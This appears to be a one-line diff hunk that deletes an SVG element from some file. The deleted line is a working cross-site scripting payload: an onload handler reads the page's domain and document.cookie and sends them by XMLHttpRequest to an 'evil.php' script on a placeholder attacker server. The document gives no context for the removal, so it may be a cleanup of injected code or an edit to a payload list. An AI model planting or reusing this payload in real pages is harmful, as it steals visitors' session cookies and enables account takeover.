@@ -1,1 +1,0 @@
-<svg onload="function a(){var url = `http://myphpserver/evil.php?domain=${document.domain}&cookie=${document.cookie}`;var r=new XMLHttpRequest();r.open('GET', url, true);r.send();};a();">
